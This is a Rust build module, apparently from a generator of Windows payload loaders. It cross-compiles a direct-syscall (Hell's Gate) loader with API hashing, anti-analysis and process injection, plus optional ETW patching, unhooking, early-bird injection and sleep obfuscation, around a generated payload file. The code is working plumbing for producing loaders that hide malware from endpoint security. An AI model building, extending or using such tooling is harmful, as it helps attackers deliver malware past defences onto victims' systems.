use std::{fs, path::Path, process::Command};

use crate::config::BuildConfig;

const CC: &str = "x86_64-w64-mingw32-gcc";
const ASBIN: &str = "x86_64-w64-mingw32-as";
const CFLAGS: &[&str] = &[
    "-D_WIN64",
    "-O2",
    "-std=gnu11",   // pin to C11 — GCC 15 defaults C23 where () means (void)
    "-Wno-unused-variable",
    "-Wno-unused-function",
    "-Wno-unknown-pragmas",
    "-Wno-int-conversion",
    "-Wno-comment",
    "-Wno-unused-but-set-variable",
];
#[cfg(not(windows))]
const INCWRAP: &str = "/tmp/wininc";

#[cfg(not(windows))]
pub fn setup_wrappers() {
    use std::fs;

    let dir = std::path::Path::new(INCWRAP);
    let sentinel = dir.join("Windows.h");
    if sentinel.exists() {
        return;
    }

    let _ = fs::create_dir_all(dir);

    // On macOS (case-insensitive FS), Windows.h and windows.h are the same file,
    // so the second write wins. Use #include_next + an include guard so the file
    // is safe to re-enter even if both names resolve to the same inode.
    // No <shlwapi.h> here — it transitively pulls <objbase.h>, which would
    // self-loop via our Objbase.h alias on a case-insensitive filesystem.
    let win_wrapper = "#ifndef _WININC_WIN_H_\n\
                       #define _WININC_WIN_H_\n\
                       #define STRSAFE_NO_DEPRECATE\n\
                       #include_next <windows.h>\n\
                       #endif\n";
    let _ = fs::write(dir.join("Windows.h"), win_wrapper);
    let _ = fs::write(dir.join("windows.h"), win_wrapper);

    // Case-alias wrappers for headers used on case-sensitive (Linux) hosts.
    // MUST use #include_next — plain #include would resolve back to this same
    // wrapper file on macOS (case-insensitive FS), causing infinite recursion.
    for (name, lower) in [
        ("Strsafe.h", "strsafe.h"),
        ("Shlwapi.h", "shlwapi.h"),
        ("WinSvc.h",  "winsvc.h"),
        ("Sddl.h",    "sddl.h"),
        ("Aclapi.h",  "aclapi.h"),
        ("Objbase.h", "objbase.h"),
    ] {
        let _ = fs::write(dir.join(name), format!("#include_next <{lower}>\n"));
    }
}

#[cfg(windows)]
pub fn setup_wrappers() {}

fn run(cmd: &mut Command, label: &str) -> Result<(), String> {
    let status = cmd
        .status()
        .map_err(|e| format!("{label} failed to spawn: {e}"))?;
    if status.success() {
        Ok(())
    } else {
        let code = status
            .code()
            .map(|c| c.to_string())
            .unwrap_or_else(|| "unknown".to_string());
        Err(format!("{label} failed: exit {code}"))
    }
}

pub fn compile(
    src_dir: &Path,
    build_dir: &Path,
    out_path: &Path,
    cfg: &BuildConfig,
) -> Result<(), String> {
    setup_wrappers();

    // The stub src/loader_config.h exists for VS IntelliSense. GCC's "" include
    // always checks the source file's directory first, so the stub would shadow
    // our generated config. Replace the stub for the duration of the build and
    // restore it afterwards (even on failure), per the stub's own comment:
    // "Real builds replace this with generated output."
    let stub_path    = src_dir.join("loader_config.h");
    let stub_backup  = fs::read(&stub_path).ok();
    let generated    = fs::read(build_dir.join("loader_config.h"))
        .map_err(|e| format!("read generated loader_config.h: {e}"))?;
    fs::write(&stub_path, &generated)
        .map_err(|e| format!("write loader_config.h to src/: {e}"))?;

    let result = compile_inner(src_dir, build_dir, out_path, cfg);

    // Restore the stub regardless of success/failure.
    if let Some(orig) = stub_backup {
        let _ = fs::write(&stub_path, orig);
    }
    result
}

fn compile_inner(
    src_dir: &Path,
    build_dir: &Path,
    out_path: &Path,
    cfg: &BuildConfig,
) -> Result<(), String> {
    let inc_src = format!("-I{}", src_dir.display());

    #[cfg(not(windows))]
    let inc_flags: Vec<String> = vec![inc_src, format!("-I{}", INCWRAP)];
    #[cfg(windows)]
    let inc_flags: Vec<String> = vec![inc_src];

    let mut objs: Vec<std::path::PathBuf> = Vec::new();

    // Step 1: Assemble HellAsm.s -> HellAsm.o
    let hellasm_s = src_dir.join("HellAsm.s");
    let hellasm_o = build_dir.join("HellAsm.o");
    run(
        Command::new(ASBIN)
            .arg(&hellasm_s)
            .arg("-o")
            .arg(&hellasm_o),
        "assemble HellAsm.s",
    )?;
    objs.push(hellasm_o);

    // Step 2: Compile loader_payload.c -> loader_payload.o
    {
        let src = build_dir.join("loader_payload.c");
        let obj = build_dir.join("loader_payload.o");
        let mut cmd = Command::new(CC);
        cmd.args(CFLAGS);
        cmd.args(&inc_flags);
        cmd.arg("-c").arg(&src).arg("-o").arg(&obj);
        run(&mut cmd, "compile loader_payload.c")?;
        objs.push(obj);
    }

    // Step 3: Compile base sources from src_dir
    let base_sources = [
        "WinApi.c",
        "ApiHashing.c",
        "HellsGate.c",
        "AntiAnalysis.c",
        "Inject.c",
        "main.c",
    ];
    for name in &base_sources {
        let src = src_dir.join(name);
        let stem = Path::new(name)
            .file_stem()
            .unwrap_or_default()
            .to_string_lossy()
            .into_owned();
        let obj = build_dir.join(format!("{stem}.o"));
        let mut cmd = Command::new(CC);
        cmd.args(CFLAGS);
        cmd.args(&inc_flags);
        cmd.arg("-c").arg(&src).arg("-o").arg(&obj);
        run(&mut cmd, &format!("compile {name}"))?;
        objs.push(obj);
    }

    // Step 4: Compile optional sources
    let mut optional: Vec<&str> = Vec::new();
    if cfg.etw_patch {
        optional.push("Etw.c");
    }
    if cfg.unhook {
        optional.push("Unhook.c");
    }
    if cfg.early_bird {
        optional.push("EarlyBird.c");
    }
    if cfg.sleep_obf {
        optional.push("SleepObf.c");
    }
    for name in &optional {
        let src = src_dir.join(name);
        let stem = Path::new(name)
            .file_stem()
            .unwrap_or_default()
            .to_string_lossy()
            .into_owned();
        let obj = build_dir.join(format!("{stem}.o"));
        let mut cmd = Command::new(CC);
        cmd.args(CFLAGS);
        cmd.args(&inc_flags);
        cmd.arg("-c").arg(&src).arg("-o").arg(&obj);
        run(&mut cmd, &format!("compile {name}"))?;
        objs.push(obj);
    }

    // Step 5: Link
    {
        let mut cmd = Command::new(CC);
        cmd.arg("-o").arg(out_path);
        cmd.args(&objs);
        cmd.arg("-lkernel32").arg("-luser32").arg("-lntdll");
        run(&mut cmd, "link")?;
    }

    Ok(())
}
